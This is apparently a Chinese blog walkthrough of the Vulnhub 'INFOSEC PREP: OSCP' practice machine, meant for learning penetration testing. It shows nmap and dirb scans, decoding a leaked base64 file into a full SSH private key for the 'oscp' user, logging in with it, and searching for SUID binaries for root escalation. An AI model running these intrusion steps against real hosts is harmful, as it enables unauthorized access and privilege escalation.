---
title: Vulnhub-INFOSEC PREP: OSCP
date: 2024-01-24  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Infosec-prep-oscp.html"
---

# INFOSEC PREP: OSCP

![image-20240124101139259](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401241209530.png)

听说这个靶场对新手比较友好，今天来试试，吃一堑长一智，这次使用virtualbox进行打开：

![image-20240124101305989](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401241209531.png)

ok，一切正常。

## 踩点

打开看一下有没有啥提示：

![172.20.10.4_](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401241209532.png)

随便点点，瞅瞅！找到一个登录界面：

![image-20240124101715360](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401241209533.png)	

还有提示：

```text
Heya! Welcome to the hunt.
In order to enter the give away, you must obtain the root flag located in /root/. Once you’ve obtained the flag, message the TryHarder bot with the command !flag <insert flag>. It will then validate the flag for verification. Should it be incorrect, it will let you know. If it’s correct, you will be given a new role on the server where you can chat with others in a private channel. Once you’ve received the role you are entered into the give away!
You must be a member of the server in order to use the command above.
For those downloading this box off vulnhub at a later time, the command above will no longer be available.
Oh yea! Almost forgot the only user on this box is “oscp”.
A big thank you to Offensive Security for providing the voucher.
Happy Hunting
-FalconSpy & InfoSec Prep Discord Server
( https://discord.gg/RRgKaep )
```

可以看出来只有一个用户名为OSCP，先扫一下开放端口和目录吧。

## 扫描开放端口

```shell
nmap -Pn -sT -p- IP -o nmap.txt -T4
```

我这里觉得太慢直接使用`nmap IP`出现了报错：

> Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 21:54 EST
> Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
> Nmap done: 1 IP address (0 hosts up) scanned in 3.03 seconds
>
> Solution: use  '-Pn' . 

结果如下：

```text
Nmap scan report for 172.20.10.4
Host is up (0.0015s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
33060/tcp open  mysqlx
```

## 目录扫描

使用`dirb`尝试：

```shell
dirb http://172.20.10.4/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401241209534.png" alt="image-20240124104654031" style="zoom:50%;" />

可以看到有`robots.txt`文件夹，看一下有没有啥惊喜：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401241209535.png" alt="image-20240124110548284" style="zoom:50%;" />

尝试访问一下，看看能不能访问：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401241209536.png" alt="image-20240124110631361" style="zoom:50%;" />

看到最后的`=`意识到这可能是`base64`编码，解码一下：

```shell
sudo curl -s 'http://172.20.10.4/secret.txt' | base64 --decode > 1.txt
```

这里如果出现问题就创建一个1.txt，给下权限再执行，获取ssh私钥，尝试连接：

```text
-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----
```

直接ssh连接上去：

```shell
ssh -i id_rsa oscp@172.20.10.4
# ssh服务开了的
# id_rsa是1.txt改了个名字：mv 1.txt id_rsa
# 用户名是给了的oscp
┌──(kali㉿kali)-[~/nmap/OSCP]
└─$ ssh -i id_rsa oscp@172.20.10.4
The authenticity of host '172.20.10.4 (172.20.10.4)' can't be established.
ED25519 key fingerprint is SHA256:OORLHLygIlTRZ4nXi9nq+WIrJ26fv7tfgvVHm8FaAzE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.20.10.4' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
  System information as of Wed 24 Jan 2024 03:28:22 AM UTC
  System load:  0.08               Processes:             172
  Usage of /:   26.8% of 19.56GB   Users logged in:       0
  Memory usage: 58%                IPv4 address for eth0: 172.20.10.4
  Swap usage:   0%
0 updates can be installed immediately.
0 of these updates are security updates.
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Sat Jul 11 16:50:11 2020 from 192.168.128.1
```

## SUID提权

> SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义.
>
>  在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件`ls`,其属主为root,当我们通过非root用户登录时,如果`ls`设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限.

先使用find命令查找SUID文件：

```bash
find / -perm -u=s -type f 2>/dev/null
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401241209538.png" alt="image-20240124114110737" style="zoom:50%;" />

使用bash进行提权：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401241209539.png" alt="image-20240124115118466" style="zoom:50%;" />

获取flag。